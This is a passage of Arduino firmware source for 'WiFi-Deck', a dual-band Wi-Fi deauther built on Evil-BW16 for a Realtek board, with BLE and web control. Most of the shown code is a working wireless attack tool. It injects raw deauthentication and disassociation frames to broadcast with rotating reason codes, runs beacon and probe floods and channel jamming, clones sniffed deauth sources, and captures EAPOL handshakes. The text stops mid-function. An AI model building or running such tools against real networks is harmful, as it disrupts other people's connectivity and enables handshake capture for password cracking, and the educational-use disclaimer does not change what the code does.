/*
   WiFi-Deck - WiFi Dual band deauther with Web Interface

   Based on Evil-BW16 v1.0.2 by 7h30th3r0n3
   Modified to add WiFi Web Server + JSON API + Mobile-friendly HTML UI

   Copyright (c) 2024 7h30th3r0n3 (original)
   WebUI modification: 2026

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited.
   Users must comply with all applicable laws and regulations.
*/

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "platform_stdlib.h"
#include "BLEDevice.h"

#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif

#include <vector>

//==========================
// User Configuration
//==========================
#define WIFI_SSID       "WiFi-Deck"
#define WIFI_PASS       "12345678"
#define WIFI_CHANNEL    1

bool USE_LED = true;

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
unsigned long num_send_frames = 3;
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

enum SniffMode {
  SNIFF_ALL,
  SNIFF_BEACON,
  SNIFF_PROBE,
  SNIFF_DEAUTH,
  SNIFF_EAPOL,
  SNIFF_PWNAGOTCHI,
  SNIFF_STOP
};

// Channel hopping configuration
bool isHopping = false;
unsigned long lastHopTime = 0;
const unsigned long HOP_INTERVAL = 500; // 500ms between hops
const int CHANNELS_2GHZ[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int CHANNELS_5GHZ[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
int currentChannelIndex = 0;
int currentChannel = WIFI_CHANNEL; // Default channel

SniffMode currentMode = SNIFF_STOP;  // Start in STOP mode
bool isSniffing = false;             // Global flag to track if sniffing is active

const int MAX_CUSTOM_CHANNELS = 50;
int customChannels[MAX_CUSTOM_CHANNELS];
int numCustomChannels = 0;
bool useCustomChannels = false;

//-------------------
// Timed Attack
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

//-------------------
// Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
//-------------------
#define BEACON_MAX_SSID_LEN 20

bool beacon_flood_enabled    = false;
unsigned long beacon_flood_delay = 50;   // ms between beacons
unsigned long last_beacon_flood  = 0;
uint16_t beacon_flood_count  = 0;

bool probe_flood_enabled     = false;
unsigned long probe_flood_delay = 30;   // ms between probes
unsigned long last_probe_flood  = 0;
uint16_t probe_flood_count   = 0;

bool signal_jam_enabled     = false;
unsigned long signal_jam_hop_delay = 100; // ms per channel
unsigned long last_signal_jam  = 0;
int signal_jam_ch_index     = 0;
uint16_t signal_jam_count   = 0;

bool deauth_sniff_enabled   = false;
uint8_t sniffed_deauth_src[6] = {0};
bool has_sniffed_deauth     = false;
unsigned long last_deauth_sniff_attack = 0;
unsigned long deauth_sniff_interval = 500;

int single_ap_index = 0;

//==========================================================
// Frame Structures
//==========================================================
// Rotating sequence number counter (must be nonzero; real APs increment)
static uint16_t seq_num_counter = 1;

// Reason code rotation sets for stronger deauth/disassoc
const uint16_t deauth_reasons[] = {1, 2, 4, 6, 7};
const uint16_t disassoc_reasons[] = {1, 2, 3, 8};
const uint8_t num_deauth_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);
const uint8_t num_disassoc_reasons = sizeof(disassoc_reasons) / sizeof(disassoc_reasons[0]);

#pragma pack(push, 1)
typedef struct {
  uint16_t frame_control = 0x00C0;  // Deauth (little-endian on wire)
  uint16_t duration = 0x003A;        // Standard duration for management frames
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0006;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0x00A0;  // Disassociation
  uint16_t duration = 0x003A;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0008;
} DisassocFrame;
#pragma pack(pop)

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

// Generate a random, locally-administered MAC for flood frames
void randomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  mac[0] = (mac[0] & 0xFE) | 0x02;  // locally administered bit
}

// Forward declarations for functions used before definition
// (Arduino IDE auto-generates these, but explicit is better)
String extractSSID(const uint8_t *frame, int totalLen, int possibleOffset = 36);
bool isPwnagotchiMac(const uint8_t *mac);
bool isEAPOL(const uint8_t *buf, int len);
void startSoftAP();

// =========================
// 802.11 Header Structure
// =========================
#pragma pack(push, 1)
struct wifi_ieee80211_mac_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

static inline uint8_t ieee80211_get_type(uint16_t fc) {
  return (fc & 0x0C) >> 2;
}
static inline uint8_t ieee80211_get_subtype(uint16_t fc) {
  return (fc & 0xF0) >> 4;
}
static inline bool is_broadcast_mac(const uint8_t *mac) {
  return mac[0]==0xFF && mac[1]==0xFF && mac[2]==0xFF && mac[3]==0xFF && mac[4]==0xFF && mac[5]==0xFF;
}

// =========================
// Promiscuous Callback
// =========================
void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
  if (currentMode == SNIFF_STOP) return;

  if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
    return;
  }

  wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
  uint16_t fc = hdr->frame_control;
  uint8_t ftype = ieee80211_get_type(fc);
  uint8_t fsubtype = ieee80211_get_subtype(fc);

  if (currentMode != SNIFF_ALL) {
    if (currentMode == SNIFF_BEACON && !(ftype == 0 && fsubtype == 8)) return;
    if (currentMode == SNIFF_PROBE && !(ftype == 0 && (fsubtype == 4 || fsubtype == 5))) return;
    if (currentMode == SNIFF_DEAUTH && !(ftype == 0 && (fsubtype == 12 || fsubtype == 10))) return;
    if (currentMode == SNIFF_EAPOL && (ftype != 2 || !isEAPOL(buf, len))) return;
    if (currentMode == SNIFF_PWNAGOTCHI && !(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
  }

  char mac2[18], mac1[18];
  snprintf(mac2, sizeof(mac2), "%02X:%02X:%02X:%02X:%02X:%02X",
           hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
           hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
  snprintf(mac1, sizeof(mac1), "%02X:%02X:%02X:%02X:%02X:%02X",
           hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
           hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);

  char logBuf[192];
  const uint8_t *framePtr = (const uint8_t *)buf;

  if (ftype == 0) {
    if (fsubtype == 8) {
      String ssid = extractSSID(framePtr, len, 36);
      if (ssid.length() > 0) {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s SSID: %s%s",
                 mac2, ssid.c_str(),
                 isPwnagotchiMac(hdr->addr2) ? " Pwnagotchi Beacon!" : "");
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s", mac2);
      }
    }
    else if (fsubtype == 12) {
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
      // Capture deauth source MAC for deauth-sniff-and-clone mode
      if (deauth_sniff_enabled && !is_broadcast_mac(hdr->addr1)) {
        memcpy(sniffed_deauth_src, hdr->addr2, 6);
        has_sniffed_deauth = true;
      }
    }
    else if (fsubtype == 4) {
      String ssid = extractSSID(framePtr, len, 24);
      if (ssid.length() > 0) {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s Probe SSID: %s", mac2, ssid.c_str());
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s", mac2);
      }
    }
    else if (fsubtype == 5) {
      String ssid = extractSSID(framePtr, len, 36);
      if (ssid.length() > 0) {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s SSID: %s", mac2, ssid.c_str());
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s", mac2);
      }
    }
    else if (fsubtype == 10) {
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
    }
    else {
      snprintf(logBuf, sizeof(logBuf), "[MGMT] Other subtype = %u", fsubtype);
    }
  }
  else if (ftype == 1) {
    snprintf(logBuf, sizeof(logBuf), "[CTRL] Subtype = %u", fsubtype);
  }
  else if (ftype == 2) {
    if (isEAPOL(buf, len)) {
      snprintf(logBuf, sizeof(logBuf), "[DATA] EAPOL detected! Source MAC: %s Destination MAC: %s", mac2, mac1);
    } else {
      snprintf(logBuf, sizeof(logBuf), "[DATA] Other data frame.");
    }
  }
  else {
    snprintf(logBuf, sizeof(logBuf), "[EXT] Type = %u", ftype);
  }

  Serial.println(logBuf);
  pushSniffLog(logBuf);
}

// =========================
// Utility Functions
// =========================
void setChannel(int newChannel) {
  if (!isSniffing) {
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
  }
  currentChannel = newChannel;
  wifi_set_channel(currentChannel);
}

void hopChannel() {
  if (isHopping && (millis() - lastHopTime >= HOP_INTERVAL)) {
    currentChannelIndex++;

    if (useCustomChannels) {
      if (currentChannelIndex >= numCustomChannels) {
        currentChannelIndex = 0;
      }
      currentChannel = customChannels[currentChannelIndex];
    } else {
      static bool use5GHz = false;
      if (use5GHz) {
        if (currentChannelIndex >= sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0])) {
          currentChannelIndex = 0;
          use5GHz = false;
        }
        currentChannel = CHANNELS_5GHZ[currentChannelIndex];
      } else {
        if (currentChannelIndex >= sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0])) {
          currentChannelIndex = 0;
          use5GHz = true;
        }
        currentChannel = CHANNELS_2GHZ[currentChannelIndex];
      }
    }

    setChannel(currentChannel);
    Serial.print("[HOP] Switched to channel ");
    Serial.println(currentChannel);
    lastHopTime = millis();
  }
}

void startSniffing() {
  if (!isSniffing) {
    Serial.println("[INFO] Enabling promiscuous mode...");
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
    setChannel(currentChannel);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    isSniffing = true;
    Serial.println("[INFO] Sniffer initialized and running.");
  }
}

void stopSniffing() {
  if (isSniffing) {
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    currentMode = SNIFF_STOP;
    Serial.println("[CMD] Sniffer stopped");
    // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
    // bring the AP and web server back up so the phone can reconnect.
    startSoftAP();
    Serial.println("[INFO] Soft AP restarted: " WIFI_SSID);
  }
}

String extractSSID(const uint8_t *frame, int totalLen, int possibleOffset) {
  if (totalLen < possibleOffset + 2) {
    return "";
  }
  uint8_t tagNumber  = frame[possibleOffset];
  uint8_t tagLength  = frame[possibleOffset + 1];
  if (tagNumber == 0 && possibleOffset + 2 + tagLength <= totalLen) {
    String essid;
    for (int i = 0; i < tagLength; i++) {
      char c = (char)frame[possibleOffset + 2 + i];
      if (c >= 32 && c <= 126) {
        essid += c;
      }
    }
    return essid;
  }
  return "";
}

bool isPwnagotchiMac(const uint8_t *mac) {
  const uint8_t pwnMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};
  for (int i = 0; i < 6; i++) {
    if (mac[i] != pwnMac[i]) return false;
  }
  return true;
}

bool isEAPOL(const uint8_t *buf, int len) {
  if (len < (24 + 8 + 4)) {
    return false;
  }
  if (buf[24] == 0xAA && buf[25] == 0xAA && buf[26] == 0x03 &&
      buf[27] == 0x00 && buf[28] == 0x00 && buf[29] == 0x00 &&
      buf[30] == 0x88 && buf[31] == 0x8E) {
    return true;
  }
  if ((buf[0] & 0x0F) == 0x08) {
    if (buf[26] == 0xAA && buf[27] == 0xAA && buf[28] == 0x03 &&
        buf[29] == 0x00 && buf[30] == 0x00 && buf[31] == 0x00 &&
        buf[32] == 0x88 && buf[33] == 0x8E) {
      return true;
    }
  }
  return false;
}

//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);
extern "C" int wifi_get_mac_address(char *mac);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);
int scanNetworks();
void printScanResults();
void handleCommand(String command);
void targetAttack();
void generalAttack();
void attackCycle();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();
void handleWebClient();
String getScanResultsJSON();
String getStatusJSON();
String getInfoJSON();
String jsonEscape(const String &s);
extern const char INDEX_HTML[];

//==========================================================
// Global Vectors
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;

//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;
unsigned long disassoc_interval = 1000;
unsigned long last_disassoc_attack = 0;
bool attack_enabled             = false;
bool scan_enabled               = false;
bool target_mode                = false;
uint32_t tx_success_count       = 0;
uint32_t tx_fail_count          = 0;

//==========================================================
// BLE (Nordic UART Service) — Android App control channel
//==========================================================
#define UART_SERVICE_UUID       "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_RX  "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_TX  "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"
#define BLE_BUF_SIZE            220   // < CHAR_VALUE_MAX_LEN (230)
#define LOG_RING_SIZE           16

BLEService UartService(UART_SERVICE_UUID);
BLECharacteristic BleRx(CHARACTERISTIC_UUID_RX);
BLECharacteristic BleTx(CHARACTERISTIC_UUID_TX);
BLEAdvertData advdata;
BLEAdvertData scndata;
volatile bool bleNotifyEnabled = false;

// Cross-thread command ring queue (BLE task -> loop)
#define CMD_RING_SIZE 8
char cmdRing[CMD_RING_SIZE][128];
volatile uint8_t cmdHead = 0;
volatile uint8_t cmdTail = 0;

// Cross-thread sniff log ring buffer (WiFi promisc thread -> loop)
char sniffLogRing[LOG_RING_SIZE][160];
volatile uint8_t logHead = 0;
volatile uint8_t logTail = 0;

//==========================================================
// Web Server
//==========================================================
WiFiServer webServer(80);

void startSoftAP() {
  // Force-close WLAN first: after promisc mode WLAN0 is still "running", so a
  // bare wifi_on(RTW_MODE_AP) would be blocked by rltk_wlan_running() and the
  // radio would never switch back to AP.
  wifi_off();
  delay(20);
  char ssid[] = WIFI_SSID;
  char pass[] = WIFI_PASS;
  char ch[4];
  snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);
  // WiFi.apbegin() completes the full stack init that wifi_start_ap() skips:
  // wifi_on + LwIP_Init + netif_set_addr(192.168.1.1) + dhcps_init (DHCP server).
  WiFi.apbegin(ssid, pass, ch, 0);
  webServer.begin();
}

//==========================================================
// BLE helpers (Nordic UART Service)
//==========================================================
void pushSniffLog(const char *msg) {
  uint8_t next = (logHead + 1) % LOG_RING_SIZE;
  if (next != logTail) {
    strncpy(sniffLogRing[logHead], msg, 159);
    sniffLogRing[logHead][159] = '\0';
    logHead = next;
  }
}

void bleSendLine(const String &line) {
  if (!BLE.connected(0) || !bleNotifyEnabled) return;
  String payload = line + "\n";
  if (payload.length() > BLE_BUF_SIZE - 1) {
    // 超长兜底：直接丢弃，避免发送截断后的坏 JSON 污染手机端行缓冲
    Serial.println("[BLE] drop oversize line");
    return;
  }
  BleTx.setData((uint8_t*)payload.c_str(), payload.length());
  BleTx.notify(0);
  delay(8);  // give the BLE stack time to drain the connection interval
}

void bleWriteCB(BLECharacteristic* chr, uint8_t connID) {
  if (chr->getDataLen() > 0) {
    String cmd = chr->readString();
    cmd.trim();
    if (cmd.length() > 0) {
      uint8_t next = (cmdHead + 1) % CMD_RING_SIZE;
      if (next != cmdTail) {
        strncpy(cmdRing[cmdHead], cmd.c_str(), sizeof(cmdRing[0]) - 1);
        cmdRing[cmdHead][sizeof(cmdRing[0]) - 1] = '\0';
        cmdHead = next;  // only advance the ring, never block the BLE task
      }
    }
  }
}

void bleNotifCB(BLECharacteristic* chr, uint8_t connID, uint16_t cccd) {
  bleNotifyEnabled = (cccd & GATT_CLIENT_CHAR_CONFIG_NOTIFY);
}

void setupBLE() {
  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
  advdata.addCompleteName("WiFi-Deck");
  scndata.addCompleteServices(BLEUUID(UART_SERVICE_UUID));

  BleRx.setWriteProperty(true);
  BleRx.setWriteNRProperty(true);
  BleRx.setWritePermissions(GATT_PERM_WRITE);
  BleRx.setWriteCallback(bleWriteCB);
  BleRx.setBufferLen(BLE_BUF_SIZE);

  BleTx.setNotifyProperty(true);
  BleTx.setCCCDCallback(bleNotifCB);
  BleTx.setBufferLen(BLE_BUF_SIZE);

  UartService.addCharacteristic(BleRx);
  UartService.addCharacteristic(BleTx);

  BLE.init();
  BLE.configAdvert()->setAdvData(advdata);
  BLE.configAdvert()->setScanRspData(scndata);
  BLE.configServer(1);
  BLE.addService(UartService);
  BLE.beginPeripheral();
  Serial.println("[INFO] BLE UART service started (WiFi-Deck)");
}

void blePushScanResults() {
  if (!BLE.connected(0) || !bleNotifyEnabled) return;
  bleSendLine("{\"t\":\"scan_begin\"}");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String line = "{\"t\":\"ap\",\"i\":" + String(i) +
                  ",\"s\":\"" + jsonEscape(scan_results[i].ssid) + "\"" +
                  ",\"b\":\"" + scan_results[i].bssid_str + "\"" +
                  ",\"c\":" + String(scan_results[i].channel) +
                  ",\"r\":" + String(scan_results[i].rssi) + "}";
    bleSendLine(line);
  }
  bleSendLine("{\"t\":\"scan_end\",\"n\":" + String(scan_results.size()) + "}");
}

void blePushStatus() {
  if (!BLE.connected(0) || !bleNotifyEnabled) return;
  String line = "{\"t\":\"st\"";
  line += ",\"atk\":" + String(attack_enabled ? 1 : 0);
  line += ",\"dis\":" + String(disassoc_enabled ? 1 : 0);
  line += ",\"bcn\":" + String(beacon_flood_enabled ? 1 : 0);
  line += ",\"prb\":" + String(probe_flood_enabled ? 1 : 0);
  line += ",\"jam\":" + String(signal_jam_enabled ? 1 : 0);
  line += ",\"snf\":" + String(deauth_sniff_enabled ? 1 : 0);
  line += ",\"snfOn\":" + String(isSniffing ? 1 : 0);
  line += ",\"hop\":" + String(isHopping ? 1 : 0);
  line += ",\"ch\":" + String(currentChannel);
  line += ",\"ok\":" + String(tx_success_count);
  line += ",\"fail\":" + String(tx_fail_count);
  line += "}";
  bleSendLine(line);
}

void blePushInfo() {
  if (!BLE.connected(0) || !bleNotifyEnabled) return;
  String line = "{\"t\":\"cfg\"";
  line += ",\"delay\":" + String(cycle_delay);
  line += ",\"scan\":" + String(scan_time);
  line += ",\"frames\":" + String(num_send_frames);
  line += ",\"ch\":" + String(start_channel);
  line += ",\"sc\":" + String(scan_between_cycles ? 1 : 0);
  line += ",\"led\":" + String(USE_LED ? 1 : 0);
  line += "}";
  bleSendLine(line);
}

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  if (ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info ptr is NULL!");
    return;
  }
  void *frame_control = alloc_mgtxmitframe((uint8_t*)ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, (uint8_t*)frame_control + 8);
    memset((void *) * (uint32_t *)((uint8_t*)frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *) * (uint32_t *)((uint8_t*)frame_control + 0x80) + 0x28;
    if (frame_data == NULL) {
      tx_fail_count++;
      Serial.println("[TX ERROR] frame_data is NULL!");
      return;
    }
    memcpy(frame_data, frame, length);
    *(uint32_t *)((uint8_t*)frame_control + 0x14) = length;
    *(uint32_t *)((uint8_t*)frame_control + 0x18) = length;
    int ret = dump_mgntframe(ptr, frame_control);
    if (ret == 0) {
      tx_success_count++;
    } else {
      tx_fail_count++;
      Serial.print("[TX ERROR] dump_mgntframe returned: ");
      Serial.println(ret);
    }
  } else {
    tx_fail_count++;
    Serial.println("[TX ERROR] alloc_mgtxmitframe returned NULL!");
  }
}

void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Flood TX
//==========================================================
void wifi_tx_beacon_frame(const char* ssid, uint8_t ssid_len, uint8_t channel) {
  uint8_t buf[80];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x80; buf[offset++] = 0x00;    // FC = Beacon
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memcpy(&buf[offset], &buf[offset - 6], 6); offset += 6;  // BSSID = SA
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  unsigned long ts = millis();
  memcpy(&buf[offset], &ts, 4); offset += 8;      // timestamp (low 4B, high 4B zero)
  buf[offset++] = 0x64; buf[offset++] = 0x00;    // beacon interval = 100 TUs
  buf[offset++] = 0x01; buf[offset++] = 0x00;    // capability = ESS

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = ssid_len;
  memcpy(&buf[offset], ssid, ssid_len); offset += ssid_len;
  buf[offset++] = 0x03; buf[offset++] = 0x01; buf[offset++] = channel;  // DS params
  buf[offset++] = 0x01; buf[offset++] = 0x04;     // Supported Rates (len=4)
  buf[offset++] = 0x82; buf[offset++] = 0x84;
  buf[offset++] = 0x8B; buf[offset++] = 0x96;

  wifi_tx_raw_frame(buf, offset);
}

//==========================================================
// Probe Request Flood TX
//==========================================================
void wifi_tx_probe_req_frame(const char* ssid, uint8_t ssid_len) {
  uint8_t buf[80];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x40; buf[offset++] = 0x00;    // FC = Probe Request
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memset(&buf[offset], 0xFF, 6); offset += 6;    // BSSID = broadcast
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = ssid_len;
  memcpy(&buf[offset], ssid, ssid_len); offset += ssid_len;
  buf[offset++] = 0x01; buf[offset++] = 0x04;     // Supported Rates (len=4)
  buf[offset++] = 0x82; buf[offset++] = 0x84;
  buf[offset++] = 0x8B; buf[offset++] = 0x96;

  wifi_tx_raw_frame(buf, offset);
}

//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
volatile bool scan_done = false;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    if (record->channel >= start_channel) {
      WiFiScanResult result;
      result.ssid = String((const char*) record->SSID.val);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);

      char bssid_str[20];
      snprintf(bssid_str, sizeof(bssid_str),
               "%02X:%02X:%02X:%02X:%02X:%02X",
               result.bssid[0], result.bssid[1], result.bssid[2],
               result.bssid[3], result.bssid[4], result.bssid[5]);
      result.bssid_str = bssid_str;
      scan_results.push_back(result);
    }
  } else {
    scan_done = true;
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks() {
  Serial.println("Starting WiFi scan...");
  scan_results.clear();
  scan_done = false;
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    // Wait for the driver to signal scan completion, using scan_time only as
    // a maximum-timeout guard so we never block forever.
    unsigned long start = millis();
    while (!scan_done && (millis() - start < scan_time)) {
      delay(50);
    }
    Serial.println("Scan completed!");
    sortByChannel(scan_results);
    blePushScanResults();
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    Serial.println("Failed to start the scan!");
    return 1;
  }
}

void printScanResults() {
  Serial.println("Detected networks:");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String freq = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial.print(i);
    Serial.print("\tSSID: ");
    Serial.print(scan_results[i].ssid);
    Serial.print("\tBSSID: ");
    Serial.print(scan_results[i].bssid_str);
    Serial.print("\tChannel: ");
    Serial.print(scan_results[i].channel);
    Serial.print("\tRSSI: ");
    Serial.print(scan_results[i].rssi);
    Serial.print(" dBm\t");
    Serial.println(freq);
  }
}

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    Serial.println("[INFO] Timed attack ended.");
  }
}

//==========================================================
// JSON Builders
//==========================================================
String jsonEscape(const String &s) {
  String out = "";
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '"') out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
